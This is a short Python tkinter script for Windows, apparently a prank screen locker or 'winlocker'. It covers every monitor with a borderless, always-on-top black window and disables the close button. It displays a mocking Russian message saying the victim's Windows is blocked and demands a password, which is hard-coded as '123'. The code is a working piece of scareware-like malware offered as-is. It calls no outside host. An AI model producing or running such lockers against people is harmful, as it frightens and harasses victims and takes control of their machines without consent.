from tkinter import *
import ctypes

root = Tk()

def quit():
    pass

def CheckPassword(event):
    if Password.get() == "123":
        root.destroy()  


user32 = ctypes.windll.user32
user32.SetProcessDPIAware()
total_width = user32.GetSystemMetrics(78)  
total_height = user32.GetSystemMetrics(79)  
virtual_x = user32.GetSystemMetrics(76)  
virtual_y = user32.GetSystemMetrics(77)  

bg = "black"
font = "Arial 25 bold"

root["bg"] = bg
root.protocol("WM_DELETE_WINDOW", quit)
root.attributes("-topmost", 1)
root.geometry(f"{total_width}x{total_height}+{virtual_x}+{virtual_y}")
root.overrideredirect(1)

Label(text="Ха лох твоя винда блокнута", fg="red", bg=bg, font=font).pack()
Label(text="\n\n\n\nВведи пароль", fg="white", bg=bg, font=font).pack()

Password = Entry(font=font)
Password.pack()
Password.bind("<Return>", CheckPassword)

root.mainloop()
